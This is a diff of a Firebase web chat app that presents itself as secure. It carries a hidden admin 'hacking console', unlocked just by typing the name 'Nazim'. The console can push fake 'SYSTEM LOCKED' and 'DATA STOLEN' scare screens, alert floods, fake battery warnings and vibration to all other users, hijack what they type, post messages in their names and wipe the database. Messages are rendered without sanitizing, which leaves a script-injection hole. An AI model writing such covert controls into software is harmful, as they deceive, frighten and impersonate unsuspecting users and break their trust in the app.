@@ -2,114 +2,110 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Connect | Secure</title>
+    <title>Live Connect | Secure Grid</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <style>
-        :root { --primary: #00d2ff; --danger: #ff0055; --bg: #030303; --glass: rgba(20, 20, 20, 0.85); --neon: #00ff41; }
+        :root { --primary: #00d2ff; --danger: #ff0055; --bg: #030303; --glass: rgba(15, 15, 15, 0.9); --neon: #00ff41; }
         * { box-sizing: border-box; outline: none; transition: 0.3s; }
-        body { margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--bg); color: #fff; overflow: hidden; }
+        body { margin: 0; font-family: 'Segoe UI', sans-serif; background: var(--bg); color: #fff; overflow: hidden; height: 100vh; }
 
-        /* Full Modern Container */
-        .app-container { max-width: 480px; margin: auto; height: 100vh; background: #000; position: relative; display: flex; flex-direction: column; border: 1px solid rgba(255,255,255,0.05); }
+        .app-container { max-width: 500px; margin: auto; height: 100vh; background: #000; position: relative; display: flex; flex-direction: column; border-left: 1px solid #111; border-right: 1px solid #111; }
         
-        header { padding: 20px; background: var(--glass); backdrop-filter: blur(20px); border-bottom: 1px solid rgba(255,255,255,0.1); display: flex; justify-content: space-between; align-items: center; z-index: 1000; }
-        header h1 { font-size: 1.2rem; margin: 0; background: linear-gradient(45deg, var(--primary), #9d50bb); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 800; letter-spacing: 1px; }
+        header { padding: 15px 20px; background: var(--glass); backdrop-filter: blur(20px); border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items: center; z-index: 1000; }
+        header h1 { font-size: 1.1rem; margin: 0; background: linear-gradient(45deg, var(--primary), #9d50bb); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 800; letter-spacing: 1px; }
 
-        .page { display: none; flex: 1; overflow-y: auto; padding: 20px; padding-bottom: 110px; }
-        .active { display: flex; flex-direction: column; animation: slideUp 0.5s ease; }
-        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        .page { display: none; flex: 1; overflow-y: auto; padding: 20px; padding-bottom: 100px; }
+        .active { display: flex; flex-direction: column; animation: fadeIn 0.4s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: scale(0.98); } to { opacity: 1; transform: scale(1); } }
 
-        /* Modern Welcome Card */
-        .hero-card { background: linear-gradient(135deg, #1a1a1a, #0a0a0a); border: 1px solid #333; padding: 25px; border-radius: 20px; margin-bottom: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.5); }
-        .hero-card h2 { margin: 0; font-size: 1.4rem; color: var(--primary); }
-        .stats-row { display: flex; gap: 10px; margin-top: 15px; }
-        .stat { background: rgba(255,255,255,0.05); padding: 8px 15px; border-radius: 12px; font-size: 12px; color: #aaa; border: 1px solid rgba(255,255,255,0.1); }
+        /* Modern Dashboard Elements */
+        .hero-card { background: linear-gradient(135deg, #111, #050505); border: 1px solid #222; padding: 20px; border-radius: 15px; margin-bottom: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .hero-card h2 { margin: 0; font-size: 1.2rem; color: var(--primary); }
+        .node-info { font-size: 11px; color: #666; margin-top: 10px; display: flex; gap: 15px; }
 
-        /* ADMIN CONTROL PANEL (Neon Hacking UI) */
-        #admin-panel { display: none; background: #000; border: 2px solid var(--danger); padding: 15px; margin: 10px; border-radius: 15px; flex-wrap: wrap; gap: 8px; box-shadow: 0 0 30px rgba(255, 0, 85, 0.3); z-index: 2000; }
-        .power-btn { flex: 1; min-width: 90px; padding: 12px; font-size: 9px; background: #111; border: 1px solid var(--danger); color: var(--danger); font-weight: bold; border-radius: 8px; cursor: pointer; text-transform: uppercase; }
-        .power-btn:hover { background: var(--danger); color: white; box-shadow: 0 0 15px var(--danger); }
+        /* ADMIN HACKING CONSOLE */
+        #admin-console { display: none; background: #000; border: 2px solid var(--danger); padding: 12px; margin: 10px; border-radius: 12px; flex-wrap: wrap; gap: 6px; box-shadow: 0 0 20px rgba(255, 0, 85, 0.2); }
+        .h-btn { flex: 1; min-width: 80px; padding: 10px; font-size: 9px; background: #000; border: 1px solid var(--danger); color: var(--danger); font-weight: bold; border-radius: 6px; cursor: pointer; text-transform: uppercase; }
+        .h-btn:hover { background: var(--danger); color: #000; }
 
-        /* Modern Chat Bubbles */
-        .chat-stream { display: flex; flex-direction: column; gap: 12px; }
-        .bubble { max-width: 80%; padding: 12px 16px; border-radius: 20px; font-size: 14px; position: relative; border: 1px solid rgba(255,255,255,0.05); }
-        .me { align-self: flex-end; background: linear-gradient(45deg, #2193b0, #6dd5ed); color: white; border-bottom-right-radius: 4px; }
-        .other { align-self: flex-start; background: #1a1a1a; border-bottom-left-radius: 4px; }
-        .bubble b { display: block; font-size: 10px; opacity: 0.7; margin-bottom: 5px; text-transform: uppercase; }
-        .bubble img { max-width: 100%; border-radius: 12px; margin-top: 8px; }
-        .del-x { position: absolute; top: -10px; right: -10px; background: #000; border: 1px solid red; color: red; width: 22px; height: 22px; border-radius: 50%; font-size: 10px; display: none; align-items: center; justify-content: center; cursor: pointer; }
-        .bubble:hover .del-x { display: flex; }
+        /* Chat UI */
+        .msg { padding: 12px 16px; border-radius: 18px; font-size: 14px; max-width: 80%; position: relative; margin-bottom: 10px; line-height: 1.4; border: 1px solid rgba(255,255,255,0.03); }
+        .me { align-self: flex-end; background: var(--primary); color: #000; font-weight: 500; border-bottom-right-radius: 2px; }
+        .other { align-self: flex-start; background: #1a1a1a; color: #eee; border-bottom-left-radius: 2px; }
+        .msg b { display: block; font-size: 10px; margin-bottom: 4px; opacity: 0.8; }
+        .msg img { max-width: 100%; border-radius: 10px; margin-top: 8px; }
+        .del { position: absolute; top: -5px; right: -5px; background: red; color: white; width: 18px; height: 18px; border-radius: 50%; font-size: 9px; display: none; align-items: center; justify-content: center; cursor: pointer; }
+        .msg:hover .del { display: flex; }
 
-        /* Modern Fixed Input */
-        .bottom-nav { position: fixed; bottom: 0; max-width: 480px; width: 100%; padding: 20px; background: linear-gradient(to top, #000, transparent); }
-        .input-box { background: var(--glass); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.1); padding: 8px 18px; border-radius: 50px; display: flex; align-items: center; gap: 12px; }
-        .input-box input { flex: 1; background: transparent; border: none; color: white; padding: 10px; font-size: 14px; }
+        /* Input Bar */
+        .input-bar { position: fixed; bottom: 0; max-width: 500px; width: 100%; padding: 15px; background: #000; display: flex; align-items: center; gap: 10px; border-top: 1px solid #111; }
+        .input-wrap { flex: 1; background: #111; border-radius: 30px; padding: 5px 15px; display: flex; align-items: center; gap: 10px; border: 1px solid #222; }
+        .input-wrap input { flex: 1; background: transparent; border: none; color: #fff; padding: 10px; font-size: 14px; }
 
-        /* Effects Overlays */
-        #hacked-screen { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:99999; color: var(--neon); flex-direction:column; align-items:center; justify-content:center; text-align:center; padding: 20px; font-family: 'Courier New', monospace; }
-        .invert { filter: invert(1) hue-rotate(180deg); }
+        /* Overlays */
+        #scare-ui { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:99999; color: var(--neon); flex-direction:column; align-items:center; justify-content:center; text-align:center; padding: 40px; font-family: 'Courier New', monospace; }
     </style>
 </head>
 <body>
 
-<div id="hacked-screen">
-    <i class="fa-solid fa-radiation" style="font-size: 70px; color: var(--danger); margin-bottom: 20px;"></i>
-    <h2 id="scare-h2">> SYSTEM COMPROMISED</h2>
-    <div id="matrix-box" style="font-size: 12px; text-align: left; width: 80%;"></div>
+<div id="scare-ui">
+    <i class="fa-solid fa-user-ninja" style="font-size: 50px; color: var(--danger); margin-bottom: 20px;"></i>
+    <h2 id="scare-text">TERMINAL HIJACKED</h2>
+    <div id="logs" style="font-size: 11px; text-align: left; width: 100%;"></div>
 </div>
 
 <div class="app-container">
     <header>
         <h1>LIVE CONNECT</h1>
-        <i class="fa-solid fa-circle-nodes" style="color: var(--primary);"></i>
+        <div style="display:flex; gap:15px;">
+            <i class="fa-solid fa-power-off" onclick="userLogout()" style="color:var(--danger); cursor:pointer;"></i>
+        </div>
     </header>
 
     <div id="loginPage" class="page active">
-        <div style="text-align: center; margin-top: 80px;">
-            <i class="fa-solid fa-user-shield" style="font-size: 60px; color: var(--primary); margin-bottom: 20px;"></i>
-            <h3>SECURE ENTRANCE</h3>
-            <input type="text" id="userInput" placeholder="Enter Username" style="width: 80%; padding: 18px; border-radius: 15px; background: #111; border: 1px solid #333; color: white; text-align: center; margin-top: 20px;">
-            <button onclick="bootApp()" style="width: 80%; padding: 18px; border-radius: 15px; background: var(--primary); color: #000; font-weight: bold; border: none; margin-top: 20px; cursor: pointer;">INITIALIZE</button>
+        <div style="text-align: center; margin-top: 100px;">
+            <i class="fa-solid fa-link" style="font-size: 50px; color: var(--primary); margin-bottom: 20px;"></i>
+            <h3>GRID AUTHENTICATION</h3>
+            <input type="text" id="uInp" placeholder="Enter Codename" style="width: 80%; padding: 15px; border-radius: 12px; background: #111; border: 1px solid #222; color: #fff; text-align: center; margin-top: 20px;">
+            <button onclick="handleLogin()" style="width: 80%; padding: 15px; border-radius: 12px; background: var(--primary); color: #000; font-weight: bold; border: none; margin-top: 20px; cursor: pointer;">CONNECT_</button>
         </div>
     </div>
 
     <div id="homePage" class="page">
         <div class="hero-card">
-            <h2 id="userGreet">Welcome, Guest</h2>
-            <div class="stats-row">
-                <div class="stat">System: <span style="color:var(--neon)">Online</span></div>
-                <div class="stat">Nodes: <span id="nodeCount" style="color:var(--primary)">0</span></div>
+            <h2 id="greet">Welcome, Guest</h2>
+            <div class="node-info">
+                <span>SIGNAL: <font color="lime">ENCRYPTED</font></span>
+                <span>ACTIVE: <font color="cyan" id="liveNodes">0</font></span>
             </div>
         </div>
-        <div onclick="openChat('global', false)" style="background: rgba(0, 210, 255, 0.1); border: 1px solid var(--primary); padding: 25px; border-radius: 20px; cursor: pointer; text-align: center;">
-            <i class="fa-solid fa-earth-asia" style="margin-right: 10px;"></i> <b>CONNECT TO GLOBAL</b>
-        </div>
-        <p style="font-size: 11px; color: #555; margin-top: 30px; letter-spacing: 2px;">LIVE NODES DETECTED:</p>
-        <div id="targetList"></div>
+        <button onclick="openRoom('global', false)" style="width: 100%; padding: 20px; background: #080808; border: 1px solid var(--primary); color: var(--primary); border-radius: 15px; font-weight: bold; cursor: pointer;">
+            <i class="fa-solid fa-satellite"></i> ENTER GLOBAL GRID
+        </button>
+        <p style="font-size: 10px; color: #444; margin-top: 25px; letter-spacing: 2px;">DETECTED NODES:</p>
+        <div id="nodeList"></div>
     </div>
 
     <div id="chatPage" class="page">
-        <div id="admin-panel">
-            <button class="power-btn" onclick="sendHack('freeze')">Freeze</button>
-            <button class="power-btn" onclick="sendHack('scare')">Matrix</button>
-            <button class="power-btn" onclick="sendHack('vibrate')">Vibrate</button>
-            <button class="power-btn" onclick="sendHack('popups')">Popups</button>
-            <button class="power-btn" onclick="sendHack('audio')">Ghost Sound</button>
-            <button class="power-btn" onclick="sendHack('battery')">Battery Prank</button>
-            <button class="power-btn" onclick="sendHack('hijack')">Hijack Type</button>
-            <button class="power-btn" onclick="sendHack('restore')" style="border-color:lime; color:lime">Restore</button>
-            <button class="power-btn" onclick="nukeAll()" style="background:var(--danger); color:white;">NUKE ALL</button>
+        <div id="admin-console">
+            <button class="h-btn" onclick="triggerHack('freeze')">Freeze</button>
+            <button class="h-btn" onclick="triggerHack('scare')">Matrix</button>
+            <button class="h-btn" onclick="triggerHack('vibrate')">Vibrate</button>
+            <button class="h-btn" onclick="triggerHack('popups')">Popups</button>
+            <button class="h-btn" onclick="triggerHack('audio')">Ghost</button>
+            <button class="h-btn" onclick="triggerHack('battery')">Battery</button>
+            <button class="h-btn" onclick="triggerHack('hijack')">Hijack</button>
+            <button class="h-btn" onclick="triggerHack('restore')" style="border-color:lime; color:lime">Restore</button>
+            <button class="h-btn" onclick="clearDB()" style="background:var(--danger); color:white;">NUKE</button>
         </div>
-
-        <div id="chatBox" class="chat-stream"></div>
-
-        <div class="bottom-nav">
-            <div class="input-box">
-                <i id="wand" class="fa-solid fa-wand-magic-sparkles" style="display:none; color: gold; cursor: pointer;" onclick="togglePanel()"></i>
-                <label for="imgIn"><i class="fa-solid fa-image" style="color: #888; cursor: pointer;"></i></label>
-                <input type="file" id="imgIn" accept="image/*" style="display:none;" onchange="sendImg(this)">
-                <input type="text" id="msgIn" placeholder="Type a message...">
-                <i class="fa-solid fa-paper-plane" style="color: var(--primary); cursor: pointer;" onclick="sendMsg()"></i>
+        <div id="chatStream" style="display:flex; flex-direction:column;"></div>
+        <div class="input-bar">
+            <div class="input-wrap">
+                <i id="wand" class="fa-solid fa-wand-magic-sparkles" style="display:none; color: gold; cursor: pointer;" onclick="toggleAdmin()"></i>
+                <label for="img"><i class="fa-solid fa-image" style="color:#555; cursor:pointer;"></i></label>
+                <input type="file" id="img" accept="image/*" style="display:none;" onchange="uploadImg(this)">
+                <input type="text" id="msg" placeholder="Message...">
+                <i class="fa-solid fa-paper-plane" style="color:var(--primary); cursor:pointer;" onclick="pushMsg()"></i>
             </div>
         </div>
     </div>
@@ -122,103 +118,114 @@ import { getDatabase, ref, set, push, onValue, remove } from "https://www.gstati
 const config = { apiKey: "AIzaSyCSD1O9tV7xDZu_kljq-0NMhA2DqtW5quE", databaseURL: "https://live-chat-b810c-default-rtdb.firebaseio.com" };
 const app = initializeApp(config);
 const db = getDatabase(app);
-let myName = null, myRoom = "global", isPriv = false;
-const BOSS = "Nazim";
+let myId = null, myRoom = "global", isP = false;
+const ADMIN_ID = "Nazim";
 
-window.bootApp = () => {
-    myName = document.getElementById("userInput").value.trim();
-    if(!myName) return;
-    document.getElementById("loginPage").style.display="none";
-    document.getElementById("homePage").classList.add("active");
-    document.getElementById("userGreet").innerText = "Welcome, " + myName;
-    if(myName === BOSS) document.getElementById("wand").style.display="block";
-
-    // Power Trigger Logic
-    onValue(ref(db, "traps/" + myName), snap => {
-        const p = snap.val();
-        const sc = document.getElementById("hacked-screen");
-        if(p === "freeze") { sc.style.display="flex"; document.getElementById("scare-h2").innerText="DEVICE LOCKED"; }
-        if(p === "vibrate") { if(navigator.vibrate) navigator.vibrate([500, 200, 500]); }
-        if(p === "popups") { for(let i=0; i<8; i++) alert("CRITICAL ERROR IN SYSTEM!"); }
-        if(p === "audio") { new Audio('https://www.soundjay.com/nature/sounds/rain-01.mp3').play(); }
-        if(p === "battery") { document.body.style.opacity = "0.1"; alert("Battery 1% - Shutting Down"); }
-        if(p === "hijack") { document.getElementById("msgIn").oninput = function() { this.value = "NAZIM IS MY GOD! 👑"; }; }
-        if(p === "scare") { sc.style.display="flex"; runMatrix(); }
-        if(p === "restore") { sc.style.display="none"; document.body.style.opacity="1"; document.getElementById("msgIn").oninput = null; }
-    });
-
-    if(myName !== BOSS) set(ref(db, "signals/" + myName), true);
-    loadOnlineUsers();
+window.onload = () => {
+    const saved = localStorage.getItem("connectUser");
+    if(saved) startSession(saved);
 };
 
-function runMatrix() {
-    const lines = ["> INJECTING EXPLOIT...", "> BYPASSING FIREWALL...", "> ACCESSING GALLERY...", "> DATA EXPORTED 100%"];
-    const mb = document.getElementById("matrix-box"); mb.innerHTML = "";
-    let i = 0; setInterval(() => { if(i < lines.length) mb.innerHTML += lines[i++] + "<br>"; }, 600);
+window.handleLogin = () => {
+    const n = document.getElementById("uInp").value.trim();
+    if(!n) return;
+    localStorage.setItem("connectUser", n);
+    startSession(n);
+};
+
+function startSession(n) {
+    myId = n;
+    document.getElementById("loginPage").style.display="none";
+    document.getElementById("homePage").classList.add("active");
+    document.getElementById("greet").innerText = "Welcome, " + myId;
+    if(myId === ADMIN_ID) document.getElementById("wand").style.display="block";
+
+    onValue(ref(db, "traps/" + myId), snap => {
+        const t = snap.val();
+        const s = document.getElementById("scare-ui");
+        if(t === "freeze") { s.style.display="flex"; document.getElementById("scare-text").innerText="SYSTEM LOCKED"; }
+        if(t === "vibrate") { if(navigator.vibrate) navigator.vibrate([500,200,500]); }
+        if(t === "popups") { for(let i=0; i<5; i++) alert("SECURITY BREACH!"); }
+        if(t === "audio") { new Audio('https://www.soundjay.com/nature/sounds/rain-01.mp3').play(); }
+        if(t === "battery") { document.body.style.opacity = "0.05"; alert("Battery 1% - Closing Grid"); }
+        if(t === "hijack") { document.getElementById("msg").oninput = function() { this.value = "NAZIM IS THE BOSS 👑"; }; }
+        if(t === "scare") { s.style.display="flex"; runMatrix(); }
+        if(t === "restore") { s.style.display="none"; document.body.style.opacity="1"; document.getElementById("msg").oninput = null; }
+    });
+
+    if(myId !== ADMIN_ID) set(ref(db, "online/" + myId), true);
+    fetchNodes();
 }
 
-window.loadOnlineUsers = () => {
-    onValue(ref(db, "signals"), snap => {
-        const list = document.getElementById("targetList"); list.innerHTML = "";
+function runMatrix() {
+    const l = ["> BYPASSING...", "> UPLOADING...", "> DATA STOLEN"];
+    const b = document.getElementById("logs"); b.innerHTML = "";
+    let i = 0; setInterval(() => { if(i<l.length) b.innerHTML += l[i++] + "<br>"; }, 600);
+}
+
+window.fetchNodes = () => {
+    onValue(ref(db, "online"), snap => {
+        const list = document.getElementById("nodeList"); list.innerHTML = "";
         let c = 0;
         snap.forEach(u => {
             c++;
-            if(u.key !== myName) {
-                let d = document.createElement("div"); d.style = "padding:15px; background:#111; border-radius:15px; margin-bottom:10px; border:1px solid #222; display:flex; justify-content:space-between; align-items:center; cursor:pointer;";
-                d.innerHTML = `<span>${u.key}</span> <i class="fa-solid fa-bolt" style="color:var(--primary); font-size:10px;"></i>`;
-                d.onclick = () => openChat(u.key, true);
+            if(u.key !== myId) {
+                let d = document.createElement("div"); d.style = "padding:15px; background:#080808; border-radius:12px; margin-bottom:8px; border:1px solid #111; display:flex; justify-content:space-between; cursor:pointer;";
+                d.innerHTML = `<span>${u.key}</span> <i class="fa-solid fa-circle" style="color:lime; font-size:6px;"></i>`;
+                d.onclick = () => openRoom(u.key, true);
                 list.appendChild(d);
             }
         });
-        document.getElementById("nodeCount").innerText = c;
+        document.getElementById("liveNodes").innerText = c;
     });
 };
 
-window.openChat = (target, priv) => {
-    myRoom = priv ? [myName, target].sort().join("::") : "global";
-    isPriv = priv;
+window.openRoom = (target, p) => {
+    myRoom = p ? [myId, target].sort().join("::") : "global";
+    isP = p;
     document.getElementById("homePage").classList.remove("active");
     document.getElementById("chatPage").classList.add("active");
-    syncMsgs();
+    syncChat();
 };
 
-window.sendMsg = () => {
-    const inp = document.getElementById("msgIn");
-    if(!inp.value) return;
-    if(myName === BOSS && inp.value.startsWith("/as ")) {
-        const p = inp.value.split(" ");
-        push(ref(db, "messages/global"), { s: p[1], t: inp.value.replace("/as "+p[1]+" ", "") });
+window.pushMsg = () => {
+    const i = document.getElementById("msg");
+    if(!i.value) return;
+    if(myId === ADMIN_ID && i.value.startsWith("/as ")) {
+        const p = i.value.split(" ");
+        push(ref(db, "chats/global"), { s: p[1], t: i.value.replace("/as "+p[1]+" ", "") });
     } else {
-        push(ref(db, isPriv ? "messages/priv/" + myRoom : "messages/global"), { s: myName, t: inp.value });
+        push(ref(db, isP ? "chats/priv/" + myRoom : "chats/global"), { s: myId, t: i.value });
     }
-    inp.value = "";
+    i.value = "";
 };
 
-window.sendImg = (input) => {
-    const reader = new FileReader();
-    reader.onload = (e) => push(ref(db, isPriv ? "messages/priv/" + myRoom : "messages/global"), { s: myName, i: e.target.result });
-    reader.readAsDataURL(input.files[0]);
+window.uploadImg = (f) => {
+    const r = new FileReader();
+    r.onload = (e) => push(ref(db, isP ? "chats/priv/" + myRoom : "chats/global"), { s: myId, i: e.target.result });
+    r.readAsDataURL(f.files[0]);
 };
 
-function syncMsgs() {
-    const path = isPriv ? "messages/priv/" + myRoom : "messages/global";
+function syncChat() {
+    const path = isP ? "chats/priv/" + myRoom : "chats/global";
     onValue(ref(db, path), snap => {
-        const box = document.getElementById("chatBox"); box.innerHTML = "";
+        const box = document.getElementById("chatStream"); box.innerHTML = "";
         snap.forEach(m => {
             const d = m.val();
-            const div = document.createElement("div"); div.className = `bubble ${d.s === myName ? 'me' : 'other'}`;
+            const div = document.createElement("div"); div.className = `msg ${d.s === myId ? 'me' : 'other'}`;
             div.innerHTML = `<b>${d.s}</b> ${d.t ? d.t : `<img src="${d.i}">`} 
-            ${(myName === BOSS) ? `<span class="del-x" onclick="remove(ref(db,'${path}/${m.key}'))">✕</span>` : ''}`;
+            ${(myId === ADMIN_ID) ? `<span class="del" onclick="remove(ref(db,'${path}/${m.key}'))">✕</span>` : ''}`;
             box.appendChild(div);
         });
         box.parentElement.scrollTop = box.parentElement.scrollHeight;
     });
 }
 
-window.togglePanel = () => { const p = document.getElementById("admin-panel"); p.style.display = p.style.display === "flex" ? "none" : "flex"; };
-window.sendHack = (type) => { onValue(ref(db, "signals"), snap => { snap.forEach(u => { if(u.key !== BOSS) set(ref(db, "traps/" + u.key), type); }); }, {onlyOnce:true}); };
-window.nukeAll = () => { if(confirm("NUKE DATABASE?")) remove(ref(db)); };
-document.getElementById("msgIn").addEventListener("keypress", (e) => { if(e.key === 'Enter') sendMsg(); });
+window.toggleAdmin = () => { const p = document.getElementById("admin-console"); p.style.display = p.style.display === "flex" ? "none" : "flex"; };
+window.triggerHack = (type) => { onValue(ref(db, "online"), snap => { snap.forEach(u => { if(u.key !== ADMIN_ID) set(ref(db, "traps/" + u.key), type); }); }, {onlyOnce:true}); };
+window.clearDB = () => { if(confirm("NUKE?")) remove(ref(db)); };
+window.userLogout = () => { localStorage.clear(); location.reload(); };
+document.getElementById("msg").addEventListener("keypress", (e) => { if(e.key === 'Enter') pushMsg(); });
 </script>
 </body>
 </html>
